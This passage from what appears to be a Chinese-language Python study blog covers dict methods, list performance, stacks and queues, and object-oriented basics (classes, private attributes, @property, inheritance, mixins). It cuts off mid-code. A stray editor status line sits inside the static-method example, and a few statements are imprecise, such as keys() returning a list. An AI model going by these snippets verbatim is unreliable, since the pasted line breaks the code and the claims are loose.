<li><code>popitem()</code><strong>返回</strong>并删除字典的最后一个键值对.,封装为<strong>一个元组</strong>（如下图）</li>
<li><code>pop(key)</code>:key存在就删除,并<strong>返回value值</strong>.</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739936.png" alt="eg1"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739937.png" alt="eg2"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739938.png" alt="eg3"></p>
<p><strong>注</strong>:del是内置函数,而其余两个为方法,后置且使用小括号.</p>
<hr>
<blockquote>
<p>get()和item()方法</p>
</blockquote>
<ul>
<li><code>get()</code>:用来返回指定<strong>键</strong>对应的值,不存在时返回None.</li>
<li><code>items()</code>:用于返回键值对,使用元组封装。<strong>可以使用这个方法使用for in进行遍历</strong>。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739939.png" alt="eg-3.5.2-3"></p>
<hr>
<blockquote>
<p>keys()方法和values()方法</p>
</blockquote>
<ul>
<li><code>keys()</code>:返回字典的键，以列表的形式。</li>
<li><code>values()</code>:返回字典的值，以列表的形式。</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739940.png" alt="eg-3.5.2-4"></p>
<hr>
<blockquote>
<p>updata方法</p>
</blockquote>
<p><strong>语法格式</strong>：<code>d1.update(d2)</code><br><strong>作用</strong>：会把d2放到d1中，重复的元素会以d2为主进行覆盖。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739941.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739942.png"></p>
<hr>
<blockquote>
<p>字典长度和字典检索</p>
</blockquote>
<ul>
<li><code>len(dict)</code>:返回字典中键的数目</li>
<li><code>key in dict</code> :某键是否存在,True  or  False</li>
</ul>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739943.png" alt="eg-3.5.2-5"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739944.png" alt="eg-3.5.2-6"></p>
<hr>
<blockquote>
<p>字典的应用：计数器</p>
</blockquote>
<p><strong>思路</strong>：利用for in 循环进行遍历列表，而后通过dict[key]+&#x3D;1的形式进行计数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">itemList = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">counter = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> itemList:</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">in</span> counter:</span><br><span class="line">        counter[item]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        counter[item]=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(counter)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h1 id="3-6-容器类"><a href="#3-6-容器类" class="headerlink" title="3.6 容器类"></a>3.6 容器类</h1><blockquote>
<p>主要介绍collections容器类,作为上数据类型的替代选择</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739945.png" alt="思维导图-3.6"></p>
<p>会在模块扩展进行介绍.</p>
<h1 id="3-7-比较各个方法的时间效率"><a href="#3-7-比较各个方法的时间效率" class="headerlink" title="3.7 比较各个方法的时间效率"></a>3.7 比较各个方法的时间效率</h1><blockquote>
<p>比较list的append()和insert()的时间效率</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_aver1</span>(<span class="params">n</span>):</span><br><span class="line">    list1 = []</span><br><span class="line">    start = time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        list1.append(<span class="literal">None</span>)</span><br><span class="line">    end = time()</span><br><span class="line">    <span class="keyword">return</span> (end-start)/n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    time_append = time_aver1(<span class="number">10000</span>)</span><br><span class="line">    <span class="built_in">print</span>(time_append)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_aver2</span>(<span class="params">n</span>):</span><br><span class="line">    list1 = []</span><br><span class="line">    start = time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        list1.insert(<span class="number">5</span>,<span class="literal">None</span>)</span><br><span class="line">    end = time()</span><br><span class="line">    <span class="keyword">return</span> (end-start)/n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    time_insert = time_aver2(<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(time_insert)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>通过比较可以看出，<strong>append()的时间效率高于insert()</strong><br><strong>原因</strong>：列表并不是链表，而是一种<strong>动态的数组</strong>。在进行插入时，append（）会直接在列表最后插入元素，没有之后元素的移动；而insert()在插入时会查询插入的位置，同时将其后的元素后移，导致时间效率较低。</p>
<p>我们可以使用insert（）在队尾插入，发现其时间效率与append（）差不多。</p>
<blockquote>
<p>使用列表实现栈、对</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Stack_push</span>(<span class="params">x,list1</span>):</span><br><span class="line">    list1.append(x)</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Stack_pop</span>(<span class="params">list1</span>):</span><br><span class="line">    list1.pop()</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enQueue</span>(<span class="params">x,list1</span>):</span><br><span class="line">    list1.append(x)</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deQueue</span>(<span class="params">list1</span>):</span><br><span class="line">    list1.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    stack1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;入栈出栈操作：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(Stack_push(<span class="number">5</span>,stack1))</span><br><span class="line">    <span class="built_in">print</span>(Stack_pop(stack1))</span><br><span class="line">    </span><br><span class="line">    Queue = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;入队出队操作：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(enQueue(<span class="number">5</span>,Queue))</span><br><span class="line">    <span class="built_in">print</span>(deQueue(Queue))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739946.png"></p>
<h1 id="3-8-其他数据结构"><a href="#3-8-其他数据结构" class="headerlink" title="3.8 其他数据结构"></a>3.8 其他数据结构</h1><blockquote>
<p>灵活使用append()与popleft()</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739950.png" alt="双端队列"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739947.png" alt="堆"></p>
<hr>
<h1 id="3-9-本章总结"><a href="#3-9-本章总结" class="headerlink" title="3.9 本章总结"></a>3.9 本章总结</h1><blockquote>
<p>对上述几种数据类型的操作方法</p>
</blockquote>
<ul>
<li>对于方法，一般是直接在原类型本体上操作的，不会返回一个新的类型。例如列表进行append,前后列表的元素不同但是地址一致。</li>
<li>而对于sorted()这样的函数，会返回一个新的数据类型。</li>
</ul>
<blockquote>
<p>对可切片、可迭代、可变的理解</p>
</blockquote>
<ul>
<li>可不可以切片要看是否可以索引，即是否有下标。string、tuple、list、range是可切片，dict、set不可。</li>
<li>可不可以迭代要看是否可以for in 遍历。string、tuple、list、dict、set等可以进行迭代。但不是所有的可迭代对象都是迭代器。</li>
<li>可不可以变化强记即可，string、tuple是不可变，其余是可变。</li>
</ul>
<hr>
<blockquote>
<p>本章错误汇总</p>
</blockquote>
<p>1、一个键不可以对应多个值信息。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739948.png"></p>
<p>2、<a href="https://www.runoob.com/python/python-func-zip.html">zip()函数的使用</a><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739949.png" alt="2"></p>
<p>3、<a href="https://blog.csdn.net/qq_25006671/article/details/94588915">dict.get()的使用：注意参数</a><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752739957.png"></p>
<p>4、杨辉三角的打印</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%-d&quot;</span>%j,end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    list1.append(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    list1 = [list1[k]+list1[k-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">2</span>)]</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
<p>关键在于每一层列表的生成，这里<strong>使用列表生成式</strong>。</p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习--ch7 面向对象程序设计</title>
    <url>/2023/04/10/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0--ch7%20%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<blockquote>
<p>写在最前面：什么是面向对象程序设计？</p>
</blockquote>
<h1 id="7-1-类和对象"><a href="#7-1-类和对象" class="headerlink" title="7.1 类和对象"></a>7.1 类和对象</h1><blockquote>
<p>思维导图如下：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887132.png"></p>
<h2 id="7-1-1-定义类和创建对象"><a href="#7-1-1-定义类和创建对象" class="headerlink" title="7.1.1 定义类和创建对象"></a>7.1.1 定义类和创建对象</h2><blockquote>
<p>基本概念：</p>
</blockquote>
<ul>
<li><strong>类</strong>：抽象的概念，</li>
<li><strong>对象</strong>：具体的东西。</li>
</ul>
<p> 类是对象的<strong>蓝图和模板</strong>，而对象是<strong>类的示例</strong>。</p>
<p> <strong>举个例子</strong>：<br> 有一种描述：可以行走，可以吃饭，可以涩涩。对于这种描述，你看会在脑海里想到一些事物，比如猫等。<br> 这里我们的<strong>描述就是一个类</strong>，而<strong>猫就是对象</strong>。</p>
<hr>
<blockquote>
<p>类的定义</p>
<blockquote>
<p>通过<strong>class关键字</strong>进行类的定义</p>
</blockquote>
</blockquote>
<p><strong>语法格式</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>:</span><br><span class="line">	<span class="comment"># 零个或多个方法（方法需要通过实例调用）</span></span><br><span class="line">	<span class="comment"># 零个或多个属性（属性是类的变量）</span></span><br></pre></td></tr></table></figure>
<p><strong>代码实例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line">s = Person(<span class="string">&#x27;xyq&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"><span class="built_in">print</span>(s.name)</span><br><span class="line"><span class="built_in">print</span>(s.get_name())</span><br></pre></td></tr></table></figure>
<p><strong>结果演示</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887141.png"></p>
<p><strong>主要部分介绍</strong>：<br>1、<code>self参数</code>：<br>这里的<strong>self不是关键字</strong>，而是一个约定俗成的定名。其实这个<strong>self就是对象本身</strong>。</p>
<p>2、<code>__init__方法</code>：<br>是构造函数，实现了对象的<strong>初始化</strong>。也就是对上代码中的name,age<strong>赋初值</strong>。</p>
<h2 id="7-1-2-访问可见性"><a href="#7-1-2-访问可见性" class="headerlink" title="7.1.2 访问可见性"></a>7.1.2 访问可见性</h2><blockquote>
<p>引入介绍：</p>
</blockquote>
<p>面向对象的<strong>三大特征</strong>：<code>封装</code>、<code>继承</code>、<code>多态</code>。<br>而<strong>访问可见性</strong>就是封装的一种体现。所谓封装，就是将私有部分放在里面，不让别人去看，而公有部分可以直接进行访问。</p>
<blockquote>
<p>具体介绍：</p>
</blockquote>
<p><strong>先看两个定义</strong>：</p>
<ul>
<li>私有属性：<strong>类方法</strong>可以访问，<strong>对象</strong>不可直接访问。以<code>两个下划线开头</code>进行标识。</li>
<li>公有属性：可以直接进行访问。</li>
</ul>
<p><strong>来看一个例子</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887262.png"></p>
<p>在上例子里，我们将name属性进行了变化，将其变成<strong>私有属性</strong>，则在外部直接使用<strong>对象就无法访问</strong>这个属性。<br>而使用<code>print(s.get_name())</code>可以进行访问，这是因为<code>get_name</code>是<strong>类里定义</strong>的方法，可以访问私有属性。</p>
<blockquote>
<p>再进一步：如何访问私有属性呢？</p>
</blockquote>
<p>答案上面已经给出了：在类中定义特定的方法，进行私有属性的访问。<br>同时，利用类方法，我们还可以实现对私有属性的有条件赋值。具体见下图：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_name</span>(<span class="params">self,name1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(name1)&gt;<span class="number">2</span>:</span><br><span class="line">            self.__name = name1</span><br><span class="line">s = Person(<span class="string">&quot;xyq&quot;</span>,<span class="number">21</span>)</span><br><span class="line"></span><br><span class="line">s.set_name(<span class="string">&quot;xyz&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.get_name())</span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887172.png"></p>
<p>我们在类中定义了一个新的方法：<code>set_name(self,name1)</code>,其中self为<strong>对象本身</strong>，用于对私有属性进行访问，name1是<strong>传递的参数</strong>。</p>
<p><strong>注意点</strong>：<br>在包含类和对象的代码里，<strong>外部调用类方法</strong>需要加上<strong>对象名前缀</strong>，内部方法<strong>访问属性</strong>，需要加上<strong>self前缀</strong>。</p>
<h2 id="7-1-3-类属性和实例属性"><a href="#7-1-3-类属性和实例属性" class="headerlink" title="7.1.3 类属性和实例属性"></a>7.1.3 类属性和实例属性</h2><blockquote>
<p>定义引入：</p>
</blockquote>
<ul>
<li>类属性：存储与类空间，所有实例对象共有的。</li>
<li>实例属性：存储在实例空间，是单个实例对象独有的。</li>
</ul>
<p><strong>注</strong>：实例对象和类有各自独立的存储空间。但是优先级：实例空间&gt;类空间&gt;基类空间。</p>
<blockquote>
<p>具体示例：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887256.png"><br>实例属性的查找优先级高于类属性。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887259.png"><br>删除了实例属性不会对类属性产生影响。</p>
<p><strong>注意点</strong>：<br>1、在<code>__init__函数</code>里定义的属性为<strong>实例属性</strong>，因为是根据传递的参数来进行赋值的。<br>2、要分清类和实例。可以将类看成一个很大的模具，<strong>单独占有空间</strong>；而实例是一个个通过模具制成的物品，这些物品也是有<strong>单独的存储空间</strong>。</p>
<h1 id="7-2-方法"><a href="#7-2-方法" class="headerlink" title="7.2 方法"></a>7.2 方法</h1><blockquote>
<p>先来思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887258.png"></p>
<h2 id="7-2-1-构造方法和析构方法"><a href="#7-2-1-构造方法和析构方法" class="headerlink" title="7.2.1 构造方法和析构方法"></a>7.2.1 构造方法和析构方法</h2><blockquote>
<p>定义引入：</p>
</blockquote>
<ul>
<li>构造方法：即<code>__init__方法</code>，负责对象的<strong>初始化</strong>，也就是对象状态的更新和属性的设置，<strong>无返回值</strong>。</li>
<li>析构方法：即<code>__del__方法</code>，负责对象的<strong>回收</strong>和内存空间的<strong>释放</strong>。</li>
</ul>
<blockquote>
<p>先来构造方法：<code>__init__</code></p>
</blockquote>
<p>这个方法是python的<strong>内置特殊方法</strong>。这个方法使用时需要<strong>注意以下几点</strong>：</p>
<ul>
<li>名字不可变，需为init。</li>
<li>不可以有返回值。</li>
<li>只会调用一次，进行对象的初始化</li>
</ul>
<p><strong>本质</strong>：就是<strong>一个函数</strong>，通过传递的参数实现对实例属性的赋值。（函数的<strong>参数相关内容</strong>可以适用）<br>下面我们通过几个例子来看一下构造函数的使用：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887260.png" alt="1"><br>使用了默认值参数进行函数的调用。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887279.png" alt="2"><br>这里使用了<strong>关键字参数</strong>，将传递的参数封装为一个<strong>字典</strong>。通过<code>kw.get(key)</code>进行属性的赋值。</p>
<blockquote>
<p>再来看一下析构函数：<code>__del__</code></p>
</blockquote>
<p>这个函数是程序<strong>自动执行的</strong>，不需要定义。其作用就是当程序结束后将对象的<strong>空间进行销毁</strong>。<br>当使用<code>del 对象名</code>删除一个实例时，也是使用了析构函数。</p>
<p><strong>注</strong>：当一个对象<strong>被引用时</strong>，使用del不会销毁此对象的存储空间。</p>
<h2 id="7-2-2-类方法和静态方法"><a href="#7-2-2-类方法和静态方法" class="headerlink" title="7.2.2 类方法和静态方法"></a>7.2.2 类方法和静态方法</h2><blockquote>
<p>定义引入：</p>
</blockquote>
<ul>
<li>静态方法：即传递的参数<strong>与某个对象实例无关</strong>，通过<code>类名.静态方法(参数...)</code>即可进行调用，<strong>不需要对象前缀</strong>。</li>
<li>类方法：在对象<strong>初始化之前</strong>进行的方法，是对当前类相关信息的获取。通过<code>对象1 = 类名.类方法()</code>进行对象的获取和初始化。</li>
</ul>
<blockquote>
<p>先来看静态方法：</p>
</blockquote>
<p><strong>语法格式</strong>：在函数定义上方使用修饰符	 <code>@staticmethod</code>进行标识，而后进行方法的定义。</p>
<p><strong>代码实例</strong>：（三角形验证）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Sanjiao</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b,c</span>):</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.c = c</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Pand</span>(<span class="params">a,b,c</span>):</span><br><span class="line">        <span class="keyword">return</span> a+b &gt;c <span class="keyword">and</span> b+c &gt; a <span class="keyword">and</span> a+c &gt; b</span><br><span class="line">    [<span class="number">219</span>:<span class="number">0</span>]行数：<span class="number">220</span> 长度：<span class="number">4096</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Get_c</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.a+self.b+self.c</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> Sanjiao.Pand(<span class="number">1</span>,<span class="number">4</span>,<span class="number">4</span>):</span><br><span class="line">    s = Sanjiao(<span class="number">1</span>,<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(s.Get_c())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong !&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在上面的代码里，使用到了静态方法，其作用就是在<strong>对象建立之前</strong>调用此方法判断数据是否合格。</p>
<blockquote>
<p>再来看一下类方法</p>
</blockquote>
<p><strong>语法格式</strong>：<br>1、使用修饰符 <code>@classmethod</code>进行标识<br>2、在定义时默认参数为<code>cls</code><br>3、在调用时使用 <code>对象名 = 类名.类方法(参数)</code>的方法进行对象的创建。(对象建立时的参数与正常建立时一样，不受类方法的影响)</p>
<h2 id="7-2-2-property装饰器"><a href="#7-2-2-property装饰器" class="headerlink" title="7.2.2 @property装饰器"></a>7.2.2 @property装饰器</h2><p><strong>作用</strong>：将一个<strong>属性</strong>变成<strong>方法</strong>进行调用</p>
<p><strong>语法格式</strong>：以<code>@property </code>进行标识，以<strong>属性名作为方法名</strong>进行定义，以<code>对象.方法名=xx</code>进行调用</p>
<p>来看一个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self,ant</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ant)&gt;<span class="number">2</span>:</span><br><span class="line">            self.__name = ant</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;wrong ant!&quot;</span>)</span><br><span class="line">        </span><br><span class="line">me = Person(<span class="string">&quot;xyq&quot;</span>,<span class="number">21</span>)</span><br><span class="line"><span class="built_in">print</span>(me.name)</span><br><span class="line">me.name = <span class="string">&#x27;xyz&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(me.name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887289.png"></p>
<p><strong>注释</strong>：<br>1、上例我们先使用了修饰器<code>@perproty</code>将name方法定义为了<strong>一个属性</strong>，其作用就是返回__name的值，可以<strong>用于获取值</strong>；<br>2、下面使用<code>@name.setter</code>进行修饰，其作用就是可以通过访问属性的形式进行<strong>属性的赋值</strong>。<br>3、通过修饰器，可以使私有属性得以直接访问与赋值，同时还可以<strong>保证程序的健壮性</strong>。</p>
<h1 id="7-3-继承和多态"><a href="#7-3-继承和多态" class="headerlink" title="7.3 继承和多态"></a>7.3 继承和多态</h1><blockquote>
<p>先放思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887271.png"></p>
<h2 id="7-3-1-继承"><a href="#7-3-1-继承" class="headerlink" title="7.3.1 继承"></a>7.3.1 继承</h2><blockquote>
<p>定义引入：</p>
</blockquote>
<p>继承的目的是为了<strong>实现已有类的扩充</strong>。</p>
<ul>
<li>父类（基类）：被继承的类。</li>
<li>子类（派生类）：创建的新的类。</li>
<li>重写：类在继承父类已有的方法后，可以对父类已有的方法给出<strong>新的实现版本</strong>，此操作称为重写。<br>子类除了继承父类提供的属性和方法，还定义了自己<strong>特有的属性和方法</strong>，所以子类比父类拥有<strong>更多的功能</strong>。</li>
</ul>
<blockquote>
<p>看一个例子：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887280.png"></p>
<p>football<strong>继承了</strong>ball类，并对ball类中的<strong>show方法</strong>进行了<strong>重写</strong>。</p>
<hr>
<p>再看一个例子：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887261.png"></p>
<p>这里在子类中调用了<strong>父类的方法</strong>，其格式为：<code>类名.方法名（self）</code>。一般调用方法是不需要传递self，但是这里需要。</p>
<blockquote>
<p>super()使用父类的构造方法</p>
</blockquote>
<p><strong>直接上图</strong>:<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648348887272.png"></p>
<p>在子类的构造方法里使用了<strong>父类的构造方法</strong>，其格式为：<code>super().__init__(name)</code>,可以把super()看成是父类。<br>当然，通过<code>父类.__init__(self,name)</code>方法也可以进行调用，不过需要<strong>显式的</strong>传递self参数。</p>
<h2 id="7-3-2-MixIn–混入功能"><a href="#7-3-2-MixIn–混入功能" class="headerlink" title="7.3.2 MixIn–混入功能"></a>7.3.2 MixIn–混入功能</h2><blockquote>
<p>定义介绍：</p>
</blockquote>
<p><strong>Mixin</strong> ：通常是<strong>实现某种功能的类</strong>，用于被其他子类继承，扩充子类的功能。</p>
<blockquote>
<p>具体例子：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">repMixin</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;[%s,%s]&quot;</span>%(self.name,self.age))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">get_set_Mixin</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self,key</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__dict__.get(key)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self,key</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__dict__.<span 